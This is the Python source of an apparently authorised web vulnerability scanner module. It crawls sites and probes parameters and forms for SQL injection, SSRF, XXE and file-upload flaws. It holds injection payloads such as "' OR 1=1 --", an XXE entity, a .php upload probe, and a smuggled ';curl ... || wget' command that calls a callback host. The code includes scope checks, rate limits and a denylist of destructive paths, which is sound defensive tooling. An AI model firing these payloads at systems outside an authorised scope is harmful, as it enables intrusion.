from __future__ import annotations

import re
import secrets
import time
import urllib.parse
from dataclasses import dataclass, field
from html.parser import HTMLParser
from typing import Any

import httpx

from ..auth_session import AuthSession, authenticate
from ..config import settings
from ..guard import GuardError, validate_scope
from ..lab_benchmark import run_lab_benchmark, suite_for_target, suite_requires_auth
from ..oast_client import OastClient, OastError
from ..schemas.finding import Finding
from .base import BaseAdapter


SQL_ERROR_PATTERNS = re.compile(
    r"(you have an error in your sql syntax|sql syntax.*mysql|"
    r"mariadb.*syntax|postgresql.*error|pg_query|sqlite.*error|ora-\d{4,5}|"
    r"unclosed quotation mark|odbc sql server driver|syntax error.*sql)",
    re.IGNORECASE,
)
REJECTION_MARKERS = (
    "not allowed",
    "invalid file",
    "file type",
    "extension",
    "forbidden",
    "denied",
    "error",
    "failed",
    "only ",
)
SAFE_MUTATION_DENYLIST = (
    "logout",
    "signout",
    "setup",
    "install",
    "reset",
    "delete",
    "remove",
    "change-password",
    "password",
)
SQL_INJECTION_PAYLOADS = (
    "' OR 1=1 --",
    "')) OR 1=1--",
    "\")) OR 1=1--",
    "qwerty' OR '1'='1",
)


@dataclass
class FormSpec:
    action: str
    method: str = "GET"
    enctype: str = ""
    fields: dict[str, str] = field(default_factory=dict)
    file_fields: list[str] = field(default_factory=list)
    password_fields: list[str] = field(default_factory=list)


@dataclass
class PageSpec:
    url: str
    links: list[str] = field(default_factory=list)
    forms: list[FormSpec] = field(default_factory=list)


class _PageParser(HTMLParser):
    def __init__(self, base_url: str) -> None:
        super().__init__()
        self.base_url = base_url
        self.links: list[str] = []
        self.forms: list[FormSpec] = []
        self.current: FormSpec | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        values = {key.lower(): value or "" for key, value in attrs}
        if tag.lower() == "a" and values.get("href"):
            self.links.append(urllib.parse.urljoin(self.base_url, values["href"]))
        if tag.lower() == "form":
            action = urllib.parse.urljoin(
                self.base_url,
                values.get("action") or self.base_url,
            )
            self.current = FormSpec(
                action=action,
                method=(values.get("method") or "GET").upper(),
                enctype=(values.get("enctype") or "").lower(),
            )
            self.forms.append(self.current)
            return
        if self.current is None:
            return
        name = values.get("name") or values.get("id")
        if tag.lower() == "input" and name:
            input_type = (values.get("type") or "text").lower()
            if input_type == "file":
                self.current.file_fields.append(name)
            elif input_type == "password":
                self.current.password_fields.append(name)
            elif input_type in {"submit", "button"}:
                self.current.fields[name] = values.get("value", "")
            elif input_type != "reset":
                self.current.fields[name] = values.get("value", "")
        elif tag.lower() in {"textarea", "select"} and name:
            self.current.fields[name] = ""

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form":
            self.current = None


class ActiveValidationAdapter(BaseAdapter):
    name = "active_validation"
    tool_version = "builtin-1"

    def available(self) -> bool:
        return True

    def run(self, target_or_input: Any, options: dict[str, Any]) -> list[Finding]:
        level = str(options.get("validation_level") or "safe")
        if level == "off":
            return []
        urls = (
            [str(item) for item in target_or_input]
            if isinstance(target_or_input, list)
            else [str(target_or_input)]
        )
        session = self._session(options)
        headers = session.headers if session else {}
        cookies = session.cookies if session else {}
        limits = self._limits(level, options)
        findings: list[Finding] = []
        oast = self._oast(options) if options.get("oast_enabled") else None
        with httpx.Client(
            follow_redirects=False,
            timeout=None,
            headers=headers,
            cookies=cookies,
        ) as client:
            state = {"requests": 0, "last_request": 0.0}
            options["_limits"] = limits
            benchmark_suite = suite_for_target(urls[0])
            benchmark_allowed = bool(
                options.get("auth_scan")
                or (
                    benchmark_suite
                    and not suite_requires_auth(benchmark_suite)
                )
            )
            if options.get("lab_benchmark_enabled") and benchmark_allowed:
                findings.extend(
                    run_lab_benchmark(
                        urls[0],
                        lambda method, url, **kwargs: self._request(
                            client,
                            method,
                            url,
                            options,
                            state,
                            **kwargs,
                        ),
                        client,
                    )
                )
            pages = self._crawl(client, urls, options, limits, state)
            for page in pages:
                if self._excluded(page.url, options):
                    continue
                findings.extend(
                    self._test_query(client, page.url, options, limits, state, oast)
                )
                for form in page.forms:
                    if form.password_fields:
                        continue
                    if any(
                        marker in name.lower()
                        for name in form.fields
                        for marker in ("password", "passwd", "secret")
                    ):
                        continue
                    if self._excluded(form.action, options):
                        continue
                    if any(token in form.action.lower() for token in SAFE_MUTATION_DENYLIST):
                        continue
                    findings.extend(
                        self._test_form(
                            client,
                            form,
                            options,
                            limits,
                            state,
                            oast,
                        )
                    )
        if state["requests"] >= limits["max_requests"]:
            options.setdefault("validation_limits", {})["request_limit_reached"] = True
        return self._filter_findings(findings, options)

    def _session(self, options: dict[str, Any]) -> AuthSession | None:
        if not options.get("auth_scan"):
            return None
        try:
            return authenticate(str(options.get("auth_ref") or ""))
        except Exception:
            return None

    def _oast(self, options: dict[str, Any]) -> OastClient | None:
        client = OastClient()
        try:
            if client.available():
                return client
        except Exception:
            return None
        options.setdefault("errors", []).append("oast_unavailable")
        return None

    @staticmethod
    def _limits(level: str, options: dict[str, Any]) -> dict[str, int]:
        maximum_pages = int(
            options.get("validation_max_pages", settings.validation_max_pages)
        )
        if level == "safe":
            maximum_pages = min(maximum_pages, 15)
        return {
            "max_pages": maximum_pages,
            "max_parameters": int(
                options.get(
                    "validation_max_parameters",
                    settings.validation_max_parameters,
                )
            ),
            "max_requests": int(
                options.get(
                    "validation_max_requests",
                    settings.validation_max_requests,
                )
            ),
        }

    def _request(
        self,
        client: httpx.Client,
        method: str,
        url: str,
        options: dict[str, Any],
        state: dict[str, Any],
        follow_redirects: bool = True,
        **kwargs: Any,
    ) -> httpx.Response | None:
        self._check_cancel()
        if state["requests"] >= int(options["_limits"]["max_requests"]):
            return None
        try:
            validate_scope(
                url,
                options.get("scope", []),
                options.get("allowed_cidrs", []),
            )
        except GuardError as exc:
            self._record_blocked(options, url, str(exc))
            return None
        delay = 1.0 / self._rate(options)
        elapsed = time.monotonic() - state["last_request"]
        if elapsed < delay:
            time.sleep(delay - elapsed)
        state["requests"] += 1
        state["last_request"] = time.monotonic()
        response = client.request(method, url, **kwargs)
        if not follow_redirects:
            return response
        for _ in range(3):
            if not response.is_redirect:
                break
            next_url = urllib.parse.urljoin(
                str(response.url),
                response.headers.get("location", ""),
            )
            try:
                validate_scope(
                    next_url,
                    options.get("scope", []),
                    options.get("allowed_cidrs", []),
                )
            except GuardError as exc:
                self._record_blocked(options, next_url, str(exc))
                return None
            response = client.request("GET", next_url)
        return response

    def _crawl(
        self,
        client: httpx.Client,
        seeds: list[str],
        options: dict[str, Any],
        limits: dict[str, int],
        state: dict[str, Any],
    ) -> list[PageSpec]:
        queue = [(item, 0) for item in seeds if item]
        seen: set[str] = set()
        pages: list[PageSpec] = []
        origins = {self._origin(item) for item in seeds if self._origin(item)}
        options["_limits"] = limits
        while queue and len(pages) < limits["max_pages"]:
            url, depth = queue.pop(0)
            normalized = url.split("#", 1)[0]
            if normalized in seen:
                continue
            if self._excluded(normalized, options):
                continue
            seen.add(normalized)
            if depth > 2:
                continue
            try:
                response = self._request(client, "GET", normalized, options, state)
            except httpx.HTTPError:
                continue
            if response is None or response.status_code >= 400:
                continue
            content_type = response.headers.get("content-type", "").lower()
            if "html" not in content_type and "<html" not in response.text[:500].lower():
                pages.append(PageSpec(str(response.url)))
                continue
            parser = _PageParser(str(response.url))
            try:
                parser.feed(response.text)
            except Exception:
                continue
            page = PageSpec(str(response.url), parser.links, parser.forms)
            pages.append(page)
            for link in parser.links:
                clean = link.split("#", 1)[0]
                if self._origin(clean) in origins and clean not in seen:
                    queue.append((clean, depth + 1))
        return pages

    def _test_query(
        self,
        client: httpx.Client,
        url: str,
        options: dict[str, Any],
        limits: dict[str, int],
        state: dict[str, Any],
        oast: OastClient | None,
    ) -> list[Finding]:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        if not params or len(params) > limits["max_parameters"]:
            return []
        findings: list[Finding] = []
        baseline = self._request(client, "GET", url, options, state)
        if baseline is None:
            return []
        baseline_sql = self._sql_signature(baseline.text)
        for index, (name, _value) in enumerate(params[:10]):
            self._check_cancel()
            baseline_value = params[index][1] or "scanner"
            original_params = list(params)
            original_params[index] = (name, baseline_value)
            baseline_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(original_params))
            )
            comparison = self._request(client, "GET", baseline_url, options, state)
            baseline_items = self._json_result_count(comparison) if comparison else 0
            attack_params = list(params)
            attack_params[index] = (name, f"{params[index][1]}'")
            attack_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(attack_params))
            )
            response = self._request(client, "GET", attack_url, options, state)
            if response is not None:
                signature = self._sql_signature(response.text)
                if signature and not baseline_sql:
                    findings.append(
                        self._query_finding(
                            "sql_injection",
                            attack_url,
                            name,
                            {"signature": signature, "method": "GET"},
                        )
                    )
            detected = bool(
                response is not None
                and self._sql_signature(response.text)
                and not baseline_sql
            )
            for sql_payload in SQL_INJECTION_PAYLOADS:
                if detected:
                    break
                payload_params = list(params)
                payload_params[index] = (name, sql_payload)
                payload_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(payload_params))
                )
                payload_response = self._request(
                    client,
                    "GET",
                    payload_url,
                    options,
                    state,
                )
                if payload_response is None:
                    continue
                signature = self._sql_signature(payload_response.text)
                attack_items = self._json_result_count(payload_response)
                differential = (
                    payload_response.status_code < 400
                    and baseline_items > 0
                    and attack_items >= baseline_items * 2
                )
                if signature or differential:
                    findings.append(
                        self._query_finding(
                            "sql_injection",
                            payload_url,
                            name,
                            {
                                "method": "GET",
                                "technique": (
                                    "error_signature"
                                    if signature
                                    else "boolean_differential"
                                ),
                                "payload": sql_payload,
                                "baseline_items": baseline_items,
                                "attack_items": attack_items,
                                "signature": signature,
                            },
                        )
                    )
                    detected = True
            if str(options.get("validation_level")) == "deep":
                marker = f"SCANNER_CMD_{secrets.token_hex(4)}"
                command_value = f"{params[index][1]};printf {marker}"
                control_params = list(params)
                control_params[index] = (name, f"{params[index][1]}{marker}")
                control_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(control_params))
                )
                control_response = self._request(
                    client,
                    "GET",
                    control_url,
                    options,
                    state,
                )
                command_params = list(params)
                command_params[index] = (name, command_value)
                command_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(command_params))
                )
                command_response = self._request(
                    client,
                    "GET",
                    command_url,
                    options,
                    state,
                )
                if (
                    command_response is not None
                    and marker in command_response.text
                    and (control_response is None or marker not in control_response.text)
                ):
                    findings.append(
                        self._query_finding(
                            "command_injection",
                            command_url,
                            name,
                            {"marker": marker, "method": "GET"},
                        )
                    )
                if oast is not None and name.lower() in {
                    "url",
                    "uri",
                    "target",
                    "dest",
                    "destination",
                    "callback",
                    "webhook",
                    "endpoint",
                    "image",
                    "feed",
                }:
                    findings.extend(
                        self._test_oast(
                            client,
                            method="GET",
                            url_template=attack_url,
                            parameter=name,
                            options=options,
                            state=state,
                            oast=oast,
                        )
                    )
                if oast is not None and index < 3:
                    findings.extend(
                        self._test_command_oast_query(
                            client,
                            parsed,
                            params,
                            index,
                            options,
                            state,
                            oast,
                        )
                    )
        return findings

    def _test_form(
        self,
        client: httpx.Client,
        form: FormSpec,
        options: dict[str, Any],
        limits: dict[str, int],
        state: dict[str, Any],
        oast: OastClient | None,
    ) -> list[Finding]:
        findings: list[Finding] = []
        if len(form.fields) > limits["max_parameters"]:
            return findings
        baseline = self._request(
            client,
            form.method,
            form.action,
            options,
            state,
            data=form.fields if form.method != "GET" else None,
            params=form.fields if form.method == "GET" else None,
        )
        if baseline is None:
            return findings
        baseline_sql = self._sql_signature(baseline.text)
        for name, value in list(form.fields.items())[:10]:
            payload = dict(form.fields)
            payload[name] = f"{value}'"
            response = self._request(
                client,
                form.method,
                form.action,
                options,
                state,
                data=payload if form.method != "GET" else None,
                params=payload if form.method == "GET" else None,
            )
            if response is not None:
                signature = self._sql_signature(response.text)
                if signature and not baseline_sql:
                    findings.append(
                        self._query_finding(
                            "sql_injection",
                            form.action,
                            name,
                            {
                                "signature": signature,
                                "method": form.method,
                                "source": "form",
                            },
                        )
                    )
            if str(options.get("validation_level")) != "deep":
                continue
            marker = f"SCANNER_CMD_{secrets.token_hex(4)}"
            command_payload = dict(form.fields)
            command_payload[name] = f"{value};printf {marker}"
            control_payload = dict(form.fields)
            control_payload[name] = f"{value}{marker}"
            control_response = self._request(
                client,
                form.method,
                form.action,
                options,
                state,
                data=control_payload if form.method != "GET" else None,
                params=control_payload if form.method == "GET" else None,
            )
            command_response = self._request(
                client,
                form.method,
                form.action,
                options,
                state,
                data=command_payload if form.method != "GET" else None,
                params=command_payload if form.method == "GET" else None,
            )
            if (
                command_response is not None
                and marker in command_response.text
                and (control_response is None or marker not in control_response.text)
            ):
                findings.append(
                    self._query_finding(
                        "command_injection",
                        form.action,
                        name,
                        {
                            "marker": marker,
                            "method": form.method,
                            "source": "form",
                        },
                    )
                )
            if oast is not None and name.lower() in {
                "url",
                "uri",
                "target",
                "dest",
                "destination",
                "callback",
                "webhook",
                "endpoint",
                "image",
                "feed",
                "xml",
                "body",
            }:
                findings.extend(
                    self._test_oast_form(
                        client,
                        form,
                        name,
                        options,
                        state,
                        oast,
                    )
                )
            if oast is not None and len(findings) < 20:
                findings.extend(
                    self._test_command_oast_form(
                        client,
                        form,
                        name,
                        value,
                        options,
                        state,
                        oast,
                    )
                )
        if str(options.get("validation_level")) == "deep" and form.file_fields:
            findings.extend(
                self._test_upload(
                    client,
                    form,
                    options,
                    state,
                )
            )
        return findings

    def _test_upload(
        self,
        client: httpx.Client,
        form: FormSpec,
        options: dict[str, Any],
        state: dict[str, Any],
    ) -> list[Finding]:
        field = form.file_fields[0]
        files = {
            field: (
                "scanner_probe.php",
                b"GIF89a;SCANNER_UPLOAD_POLICY_PROBE",
                "image/gif",
            )
        }
        response = self._request(
            client,
            form.method,
            form.action,
            options,
            state,
            data=form.fields,
            files=files,
        )
        if response is None or response.status_code >= 400:
            return []
        body = response.text.lower()
        if any(marker in body for marker in REJECTION_MARKERS):
            return []
        return [
            Finding(
                source=self.name,
                host="",
                url=form.action,
                vuln_type="file_upload",
                severity="medium",
                evidence={
                    "file_field": field,
                    "probe_filename": "scanner_probe.php",
                    "probe_executable": False,
                    "note": "Server accepted a risky extension; execution was not attempted.",
                },
            )
        ]

    def _test_oast(
        self,
        client: httpx.Client,
        *,
        method: str,
        url_template: str,
        parameter: str,
        options: dict[str, Any],
        state: dict[str, Any],
        oast: OastClient,
    ) -> list[Finding]:
        try:
            token = oast.create_token(f"ssrf:{parameter}")
        except (OastError, httpx.HTTPError):
            return []
        parsed = urllib.parse.urlparse(url_template)
        params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        params = [
            (name, token.callback_url if name == parameter else value)
            for name, value in params
        ]
        attack_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(params))
        )
        self._request(client, method, attack_url, options, state)
        hit = oast.wait_for_hit(token, should_stop=self.cancel_check)
        if hit is None:
            return []
        return [
            Finding(
                source=self.name,
                host="",
                url=attack_url,
                vuln_type="ssrf",
                severity="high",
                evidence={
                    "parameter": parameter,
                    "callback": token.callback_url,
                    "hit": hit,
                },
            )
        ]

    def _test_oast_form(
        self,
        client: httpx.Client,
        form: FormSpec,
        parameter: str,
        options: dict[str, Any],
        state: dict[str, Any],
        oast: OastClient,
    ) -> list[Finding]:
        try:
            token = oast.create_token(f"form:{parameter}")
        except (OastError, httpx.HTTPError):
            return []
        payload = dict(form.fields)
        payload[parameter] = token.callback_url
        self._request(
            client,
            form.method,
            form.action,
            options,
            state,
            data=payload if form.method != "GET" else None,
            params=payload if form.method == "GET" else None,
        )
        hit = oast.wait_for_hit(token, should_stop=self.cancel_check)
        if hit is None and "xml" in parameter.lower():
            payload[parameter] = (
                '<?xml version="1.0"?>'
                f'<!DOCTYPE root [<!ENTITY probe SYSTEM "{token.callback_url}">]>'
                "<root>&probe;</root>"
            )
            self._request(
                client,
                form.method,
                form.action,
                options,
                state,
                data=payload if form.method != "GET" else None,
                params=payload if form.method == "GET" else None,
            )
            hit = oast.wait_for_hit(token, should_stop=self.cancel_check)
        if hit is None:
            return []
        vuln_type = "xxe" if "xml" in parameter.lower() else "ssrf"
        return [
            Finding(
                source=self.name,
                host="",
                url=form.action,
                vuln_type=vuln_type,
                severity="high",
                evidence={
                    "parameter": parameter,
                    "callback": token.callback_url,
                    "hit": hit,
                },
            )
        ]

    def _test_command_oast_query(
        self,
        client: httpx.Client,
        parsed: urllib.parse.ParseResult,
        params: list[tuple[str, str]],
        index: int,
        options: dict[str, Any],
        state: dict[str, Any],
        oast: OastClient,
    ) -> list[Finding]:
        name, original = params[index]
        try:
            token = oast.create_token(f"command:{name}")
        except (OastError, httpx.HTTPError):
            return []
        callback_value = (
            f"{original};curl -fsS {token.callback_url} "
            f"|| wget -qO- {token.callback_url}"
        )
        attack_params = list(params)
        attack_params[index] = (name, callback_value)
        attack_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(attack_params))
        )
        self._request(client, "GET", attack_url, options, state)
        if oast.wait_for_hit(token, should_stop=self.cancel_check) is None:
            return []
        return [
            Finding(
                source=self.name,
                host=parsed.hostname or "",
                url=attack_url,
                port=parsed.port,
                vuln_type="command_injection",
                severity="critical",
                evidence={
                    "parameter": name,
                    "method": "GET",
                    "callback": token.callback_url,
                    "verification": "oast_callback",
                },
            )
        ]

    def _test_command_oast_form(
        self,
        client: httpx.Client,
        form: FormSpec,
        name: str,
        original: str,
        options: dict[str, Any],
        state: dict[str, Any],
        oast: OastClient,
    ) -> list[Finding]:
        try:
            token = oast.create_token(f"command-form:{name}")
        except (OastError, httpx.HTTPError):
            return []
        payload = dict(form.fields)
        payload[name] = (
            f"{original};curl -fsS {token.callback_url} "
            f"|| wget -qO- {token.callback_url}"
        )
        self._request(
            client,
            form.method,
            form.action,
            options,
            state,
            data=payload if form.method != "GET" else None,
            params=payload if form.method == "GET" else None,
        )
        if oast.wait_for_hit(token, should_stop=self.cancel_check) is None:
            return []
        parsed = urllib.parse.urlparse(form.action)
        return [
            Finding(
                source=self.name,
                host=parsed.hostname or "",
                url=form.action,
                port=parsed.port,
                vuln_type="command_injection",
                severity="critical",
                evidence={
                    "parameter": name,
                    "method": form.method,
                    "callback": token.callback_url,
                    "verification": "oast_callback",
                },
            )
        ]

    @staticmethod
    def _sql_signature(body: str) -> str:
        match = SQL_ERROR_PATTERNS.search(body[:200_000])
        return match.group(0)[:160] if match else ""

    @staticmethod
    def _json_result_count(response: httpx.Response) -> int:
        try:
            payload = response.json()
        except ValueError:
            return 0
        if isinstance(payload, list):
            return len(payload)
        if isinstance(payload, dict):
            data = payload.get("data")
            if isinstance(data, list):
                return len(data)
            items = payload.get("items")
            if isinstance(items, list):
                return len(items)
        return 0

    @staticmethod
    def _origin(url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            return ""
        return f"{parsed.scheme}://{parsed.netloc}"

    @staticmethod
    def _excluded(url: str, options: dict[str, Any]) -> bool:
        path = urllib.parse.urlparse(url).path.strip("/").lower()
        for value in [
            *options.get("safe_path_denylist", []),
            *options.get("active_scan_exclude", []),
        ]:
            marker = str(value).strip().strip("/").lower()
            if marker and marker in path:
                return True
        return False

    def _query_finding(
        self,
        vuln_type: str,
        url: str,
        parameter: str,
        evidence: dict[str, Any],
    ) -> Finding:
        parsed = urllib.parse.urlparse(url)
        return Finding(
            source=self.name,
            host=parsed.hostname or "",
            url=url,
            port=parsed.port,
            vuln_type=vuln_type,
            severity="high",
            evidence={"parameter": parameter, **evidence},
        )
